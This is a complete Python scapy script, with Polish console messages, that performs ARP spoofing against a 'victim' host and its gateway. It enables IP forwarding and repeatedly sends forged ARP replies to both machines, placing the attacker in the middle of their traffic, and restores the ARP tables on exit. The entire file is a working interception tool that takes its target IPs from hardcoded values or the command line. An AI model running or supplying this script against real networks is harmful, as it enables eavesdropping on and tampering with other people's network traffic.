#!/usr/bin/env python
from scapy.all import Ether, ARP, srp, sendp, send
import time
import os
import sys
import signal

def get_mac(ip_address):
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address)
    answered, unanswered = srp(arp_request, timeout=1, verbose=False)
    if answered:
        return answered[0][1].hwsrc
    else:
        print(f"[-] Nie udało się uzyskać adresu MAC dla {ip_address}")
        return None

def spoof(target_ip, spoof_ip, target_mac):
    packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, verbose=False)

def restore(destination_ip, source_ip, destination_mac, source_mac):
    packet = Ether(dst=destination_mac)/ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    sendp(packet, count=5, verbose=False)

def signal_handler(sig, frame):
    print("\n[!] Wykryto przerwanie (Ctrl+C). Przywracanie tablic ARP...")
    restore(target_ip, gateway_ip, target_mac, gateway_mac)
    restore(gateway_ip, target_ip, gateway_mac, target_mac)
    print("[+] Tablice ARP przywrócone. Zamykanie.")
    # os.system("sysctl -w net.ipv4.ip_forward=0")
    sys.exit(0)

if __name__ == "__main__":
    target_ip = "192.168.164.103"
    gateway_ip = "192.168.164.215"

    if len(sys.argv) > 2:
        target_ip = sys.argv[1]
        gateway_ip = sys.argv[2]
    elif target_ip == "IP_OFIARY" or gateway_ip == "IP_BRAMY":
        print("Użycie: sudo python arp_spoof.py <IP_OFIARY> <IP_BRAMY>")
        print("Lub zmień wartości target_ip i gateway_ip w kodzie.")
        sys.exit(1)

    os.system("sysctl -w net.ipv4.ip_forward=1")

    print(f"[*] Cel ataku (ofiara): {target_ip}")
    print(f"[*] Brama domyślna: {gateway_ip}")

    target_mac = get_mac(target_ip)
    if not target_mac:
        print("[-] Nie można uzyskać MAC ofiary. Przerywam.")
        sys.exit(1)
    print(f"[+] MAC ofiary: {target_mac}")

    gateway_mac = get_mac(gateway_ip)
    if not gateway_mac:
        print("[-] Nie można uzyskać MAC bramy. Przerywam.")
        sys.exit(1)
    print(f"[+] MAC bramy: {gateway_mac}")

    signal.signal(signal.SIGINT, signal_handler)

    print("\n[*] Rozpoczynanie ARP spoofingu... Naciśnij Ctrl+C, aby zakończyć.")
    sent_packets_count = 0
    try:
        while True:
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            sent_packets_count += 2
            print(f"\r[*] Wysłano pakietów: {sent_packets_count}", end="")
            sys.stdout.flush()
            time.sleep(2)
    except Exception as e:
        print(f"\n[!] Wystąpił błąd: {e}")
        print("[!] Przywracanie tablic ARP...")
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        # os.system("sysctl -w net.ipv4.ip_forward=0")
        print("[+] Tablice ARP przywrócone. Zamykanie.")